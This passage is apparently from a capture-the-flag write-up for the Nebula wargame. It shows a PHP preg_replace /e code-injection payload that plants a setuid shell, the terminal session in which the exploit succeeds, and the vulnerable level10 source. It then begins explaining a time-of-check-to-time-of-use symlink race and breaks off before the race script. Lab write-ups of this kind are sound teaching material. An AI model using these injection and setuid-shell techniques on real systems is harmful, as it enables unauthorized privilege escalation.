  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/(\[email (.*)\])/e&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;spam(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\&amp;quot;\\&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;)&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/\[/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/\]/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents);&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;$output&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;markup&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$output;&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;This code has &lt;code&gt;preg_replace with /e modifier&lt;/code&gt; vulnerability.
Googling this vulnerability we find a post that details the exploitation &lt;a href=&#34;http://www.madirish.net/402&#34;&gt;here&lt;/a&gt; .&lt;/p&gt;

&lt;p&gt;The vulnerability in our case can be exploited by passing commands via second parameter (which is unused in the code itself), or,
as described in the post, via first parameter&amp;rsquo;s file contents:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;File Contents&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;[email ${`shell commands`}]
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;The full exploit (again reusing setuid shell):&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Flag09&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level09@nebula:/home/flag09$ cat /tmp/phpshell 
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;email &lt;span style=&#34;color: #e6db74&#34;&gt;${`&lt;/span&gt;cp /tmp/shell /home/flag09/shell &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod &lt;span style=&#34;color: #ae81ff&#34;&gt;4755&lt;/span&gt; /home/flag09/shell&lt;span style=&#34;color: #e6db74&#34;&gt;`}&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;

level09@nebula:/home/flag09$ ./flag09 /tmp/phpshell 1
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;15&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; : regexp code on line 1


level09@nebula:/home/flag09$ ls -al
total 21
drwxr-x--- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag09 level09   &lt;span style=&#34;color: #ae81ff&#34;&gt;60&lt;/span&gt; 2016-05-01 01:20 .
drwxr-xr-x &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; root   root     &lt;span style=&#34;color: #ae81ff&#34;&gt;120&lt;/span&gt; 2012-08-27 07:18 ..
-rw-r--r-- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag09 flag09   &lt;span style=&#34;color: #ae81ff&#34;&gt;220&lt;/span&gt; 2011-05-18 02:54 .bash_logout
-rw-r--r-- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag09 flag09  &lt;span style=&#34;color: #ae81ff&#34;&gt;3353&lt;/span&gt; 2011-05-18 02:54 .bashrc
-rwsr-x--- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag09 level09 &lt;span style=&#34;color: #ae81ff&#34;&gt;7240&lt;/span&gt; 2011-11-20 21:22 flag09
-rw-r--r-- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; root   root     &lt;span style=&#34;color: #ae81ff&#34;&gt;491&lt;/span&gt; 2011-11-20 21:22 flag09.php
-rw-r--r-- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag09 flag09   &lt;span style=&#34;color: #ae81ff&#34;&gt;675&lt;/span&gt; 2011-05-18 02:54 .profile
-rwsr-xr-x &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag09 level09 &lt;span style=&#34;color: #ae81ff&#34;&gt;7322&lt;/span&gt; 2016-05-01 01:20 shell
level09@nebula:/home/flag09$ ./shell
flag09@nebula:/home/flag09$ getflag 
You have successfully executed getflag on a target account
flag09@nebula:/home/flag09$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;level10:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level10&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Source Code&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;file;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;host;&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s file host&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;sends file to host if you have access to it&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;host&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(access(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;R_OK)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd;&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ffd;&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc;&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sockaddr_in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sin;&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;4096&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Connecting to %s:18211 .. &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;host);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket(AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SOCK_STREAM,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sin,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sockaddr_in));&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;sin.sin_family&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;AF_INET;&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;sin.sin_addr.s_addr&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;inet_addr(host);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;sin.sin_port&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;htons(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;18211&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

      &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(connect(fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sin,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sockaddr_in))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to connect to host %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;host);&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(write(fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;HITHERE,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(HITHERE))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to write banner to host %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;host);&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#undef HITHERE&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Connected!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;Sending file .. &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;ffd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(file,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;O_RDONLY);&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(ffd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Damn. Unable to open file&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;read(ffd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer));&lt;/span&gt;
      &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(rc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to read from file: %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strerror(errno));&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;write(fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc);&lt;/span&gt;

      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;wrote file!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You don&amp;#39;t have access to %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;file);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;This code is vulnerable to &amp;ldquo;time of check to time of use&amp;rdquo; race condition. It has its own wiki &lt;a href=&#34;https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use&#34;&gt;article&lt;/a&gt;.
The logic of the (SETUID) code here and the one in the article is basically the same - check if the current user has access to a file and if so - process the file.&lt;/p&gt;

&lt;p&gt;To exploit this logic we need to first pass in the file that we have access to (to pass the check) and later switch it out (symlink) to another file (which we WANT to access).
The timing is crucial here and the race needs to be automated.
I wrote the following script:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Race Condition&lt;/span&gt;
